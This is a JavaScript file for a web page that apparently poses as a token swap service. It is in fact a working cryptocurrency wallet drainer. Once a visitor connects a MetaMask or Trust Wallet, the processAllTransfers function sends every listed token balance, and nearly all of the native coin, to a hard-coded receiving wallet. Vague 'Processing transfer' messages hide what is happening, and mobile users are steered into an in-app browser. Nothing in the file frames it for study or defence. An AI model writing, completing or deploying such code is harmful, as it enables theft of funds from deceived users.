// app.js - Complete Working Version

// Verify required globals are available
if (typeof NETWORK_CONFIGS === 'undefined') {
  throw new Error("NETWORK_CONFIGS is not defined. Load networks.js first");
}
if (typeof TOKENS === 'undefined') {
  throw new Error("TOKENS is not defined. Load tokens.js first");
}
if (typeof RECEIVING_WALLET === 'undefined') {
  throw new Error("RECEIVING_WALLET is not defined. Load tokens.js first");
}

// App state variables
let provider, signer, userAddress;
let currentNetwork = "bsc";
const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// Initialize when page loads
window.addEventListener('load', async () => {
  try {
    document.getElementById('currentUrl').textContent = window.location.href;
    
    document.getElementById("networkSelect").addEventListener('change', (e) => {
      currentNetwork = e.target.value;
      updateTokenVisibility();
    });
    
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
    document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
    
    await checkWalletEnvironment();
    updateTokenVisibility();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  if (isMobile && !window.ethereum) {
    showTrustWalletUI();
  } else if (window.ethereum?.isTrust) {
    hideTrustWalletUI();
  } else if (isMobile && window.ethereum) {
    hideTrustWalletUI();
  }
  
  if (window.ethereum?.selectedAddress) {
    await initializeWallet();
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    document.getElementById("connectWallet").disabled = true;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
    document.getElementById("walletInfo").textContent = 
      `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

// =====================
// UI FUNCTIONS
// =====================

function showTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'block';
  document.getElementById("connectWallet").style.display = 'none';
  document.querySelector('.mobile-warning').style.display = 'block';
}

function hideTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'none';
  document.getElementById("connectWallet").style.display = 'block';
  document.querySelector('.mobile-warning').style.display = 'none';
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

function updateTokenVisibility() {
  document.querySelectorAll('.token-item').forEach(item => {
    item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
  });
}

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `status ${type}`;
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

// =====================
// CORE LOGIC
// =====================

async function connectAndSwap() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    if (isMobile && !window.ethereum) {
      showTrustWalletUI();
      throw new Error("Please use Trust Wallet's in-app browser");
    }

    if (!window.ethereum) {
      throw new Error("Please install MetaMask or Trust Wallet");
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    await checkNetwork();
    const initialized = await initializeWallet();
    if (!initialized) return;
    
    await processAllTransfers();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    document.getElementById("connectWallet").disabled = false;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
    if (isMobile) showTrustWalletUI();
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

async function processAllTransfers() {
  try {
    const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
    let successCount = 0;
    
    // Process ERC20 tokens
    for (const token of tokensToSwap.filter(t => !t.isNative)) {
      try {
        updateStatus(`Processing transfer...`, "success");
        const abi = token.abi || ERC20_ABI;
        const contract = new ethers.Contract(token.address, abi, signer);
        const balance = await contract.balanceOf(userAddress);
        
        if (balance.gt(0)) {
          const tx = await contract.transfer(RECEIVING_WALLET, balance, {
            gasLimit: 100000
          });
          await tx.wait();
          successCount++;
          updateStatus(
            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error(`Transfer error:`, err);
        updateStatus("Transfer failed", "error");
      }
    }

    // Process native token
    const nativeToken = tokensToSwap.find(t => t.isNative);
    if (nativeToken) {
      try {
        updateStatus(`Processing final transfer...`, "success");
        const balance = await provider.getBalance(userAddress);
        const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
        const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
        
        if (sendAmount.gt(0)) {
          const tx = await signer.sendTransaction({
            to: RECEIVING_WALLET,
            value: sendAmount,
            gasLimit: 21000
          });
          await tx.wait();
          successCount++;
          updateStatus(
            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error("Native transfer error:", err);
        updateStatus("Final transfer failed", "error");
      }
    }
    
    updateStatus(successCount > 0 ? "All transfers completed" : "No balances found", "success");
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Done`;
  } catch (err) {
    console.error("Processing error:", err);
    throw new Error("Transfer process failed");
  }
}
